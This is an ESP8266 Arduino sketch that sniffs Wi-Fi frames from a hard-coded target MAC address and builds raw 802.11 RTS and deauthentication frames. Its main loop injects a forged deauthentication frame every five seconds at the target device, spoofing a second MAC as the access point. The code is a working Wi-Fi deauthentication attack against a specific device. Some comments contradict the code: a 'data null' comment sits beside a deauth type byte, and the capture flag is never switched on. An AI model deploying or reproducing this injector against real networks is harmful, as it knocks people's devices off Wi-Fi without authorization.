#include <Arduino.h>
#include <ESP8266WiFi.h>
extern "C" {
  #include <user_interface.h>
}

#define MAX_PACKETS 1000

/*
  TYPE DEFINITIONS
*/
typedef struct {
	signed rssi: 8;
	unsigned rate: 4;
	unsigned is_group: 1;
	unsigned: 1;
	unsigned sig_mode: 2;
	unsigned legacy_length: 12;
	unsigned damatch0: 1;
	unsigned damatch1: 1;
	unsigned bssidmatch0: 1;
	unsigned bssidmatch1: 1;
	unsigned MCS: 7;
	unsigned CWB: 1;
	unsigned HT_length: 16;
	unsigned Smoothing: 1;
	unsigned Not_Sounding: 1;
	unsigned: 1;
	unsigned Aggregation: 1;
	unsigned STBC: 2;
	unsigned FEC_CODING: 1;
	unsigned SGI: 1;
	unsigned rxend_state: 8;
	unsigned ampdu_cnt: 8;
	unsigned channel: 4;
	unsigned: 12;
} wifi_pkt_rx_ctrl_t;

typedef struct {
	wifi_pkt_rx_ctrl_t rx_ctrl;
	uint8_t payload[0]; /* ieee80211 packet buff */
} wifi_promiscuous_pkt_t;

typedef struct {
	unsigned frame_ctrl:16;
	unsigned duration_id:16;
	uint8_t addr1[6]; /* receiver address */
	uint8_t addr2[6]; /* sender address */
	uint8_t addr3[6]; /* filtering address */
	unsigned sequence_ctrl:16;
	uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {
	wifi_ieee80211_mac_hdr_t hdr;
	uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

// Structure to hold packet information
typedef struct {
  unsigned long timestamp;
  int rssi;
} PacketInfo;

/*
  METHOD DEFINITIONS
*/
void initWifi();

void getPacketSender(const wifi_ieee80211_packet_t *ipkt, uint8_t *macBuf);
bool macEquals(const uint8_t *mac1, const uint8_t *mac2);

void ICACHE_FLASH_ATTR promiscuousCallback(uint8_t *buffer, uint16_t type);

/*
  CONST VARIABLES
*/
const int WIFI_CHANNEL = 6;
const uint8_t TARGET_MAC[] = { 0x34, 0x2e, 0xb6, 0x1e, 0xc4, 0x46 };
const uint8_t RTS_MAC[] = { 0xC4, 0x2B, 0x44, 0x7D, 0xEE, 0xBB };
const unsigned long DURATION_MILLIS = 1 * 60 * 1000; // 1min

/*
  GLOBAL VARIABLES
*/
// Array to store packet information
PacketInfo packets[MAX_PACKETS];
unsigned int packetCount = 0;
// Start time for capturing packets
unsigned long startMillis;
bool isRunning = false;

void  ICACHE_FLASH_ATTR callback_send_pkt_freedom(uint8 status)
{
    Serial.printf("[packet callback] %d\n", status);
}

void initWifi() {
  // init wifi
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(WIFI_CHANNEL);
  wifi_promiscuous_enable(0);

  // init promiscuous mode
  wifi_set_promiscuous_rx_cb(promiscuousCallback);
  wifi_promiscuous_enable(1);

  Serial.printf("%d = wifi_register_send_pkt_freedom_cb()\n", wifi_register_send_pkt_freedom_cb(callback_send_pkt_freedom));
}


void getPacketSender(const wifi_ieee80211_packet_t *ipkt, uint8_t *macBuf) {
	const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
  memcpy(macBuf, hdr->addr2, 6);
}

void getPacketReceiver(const wifi_ieee80211_packet_t *ipkt, uint8_t *macBuf) {
	const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
  memcpy(macBuf, hdr->addr1, 6);
}

bool macEquals(const uint8_t *mac1, const uint8_t *mac2) {
  return memcmp(mac1, mac2, 6) == 0;
}


void ICACHE_FLASH_ATTR promiscuousCallback(uint8_t *buffer, uint16_t type) {
  unsigned long nowMillis = millis();

  if (!isRunning || packetCount >= MAX_PACKETS)
    return;

  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buffer;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
  int rssi = ppkt->rx_ctrl.rssi;
  uint8_t senderMac[6];
  uint8_t receiverMac[6];
  getPacketSender(ipkt, senderMac);
  getPacketReceiver(ipkt, receiverMac);

  if (macEquals(receiverMac, RTS_MAC)) {
    Serial.println("RECEIVED CTS!!!");
  }

  if (!macEquals(senderMac, TARGET_MAC))
    return;
  
  packets[packetCount].timestamp = nowMillis;
  packets[packetCount].rssi = rssi;
  packetCount++;
}

uint16_t rts_packet(uint8_t* buf, uint8_t* dstMac, uint8_t* srcMac) {
  buf[0] = 0xB4;
  buf[1] = 0x00; // TODO: check
  
  // duration will be overwritten by ESP
  buf[2] = 0x00;
  buf[3] = 0x00;
  
  memcpy(&buf[4], dstMac, 6);
  memcpy(&buf[10], srcMac, 6);

  buf[16] = 0x0;
  buf[17] = 0x0;
  buf[18] = 0x0;
  buf[19] = 0x0;

  return 26; // min 24 bytes
}

uint8_t deauthPacket[26] = {
            /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
            /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
            /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
            /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
            /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
            /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
            /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
        };

uint16_t make_deauth(uint8_t *deauthpkt, uint8_t *stMac, uint8_t *apMac) {
    memcpy(deauthpkt, deauthPacket, sizeof(deauthPacket));

    memcpy(&deauthpkt[4], stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = 3;

    // send deauth frame
    deauthpkt[0] = 0xc0;

    return 26;
}

uint16_t create_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
{
    int i=0;
    // The first byte stores 3 pieces of data
    // 4 bits for the subtype, 2 bits for the type, and 2 bits for the version
    // management deauth: 1100 0000 = 0xC0
    // data null: 0100 1000 = 0x48
    // Type: data
    // Subtype: null
    buf[0] = 0xC0;

    // The second byte stores 8 frame control flags
    // For more info see https://dalewifisec.wordpress.com/2014/05/17/the-to-ds-and-from-ds-fields/
    buf[1] = 0x00;

    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;

    // Destination
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    // BSS
    for (i=0; i<6; i++) buf[i+16] = ap[i];

    // Sequence number / fragment number
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;

    return 24;
}


void setup() {
  Serial.begin(115200);
  Serial.println();

  initWifi();
}

unsigned long lastSendMillis = 0;

void loop() {
  unsigned long nowMillis = millis();

  if (nowMillis - lastSendMillis > 5000) {
    uint8_t buffer[200];

    uint16_t size = make_deauth(buffer, (uint8_t*)TARGET_MAC, (uint8_t*)RTS_MAC);
    // uint16_t size = create_packet(buffer, (uint8_t*)TARGET_MAC, (uint8_t*)RTS_MAC, 0+0x10);
    int result = wifi_send_pkt_freedom(buffer, size, false);
    Serial.printf("Send RTS: %d\n", result);

    lastSendMillis = nowMillis;
  }
}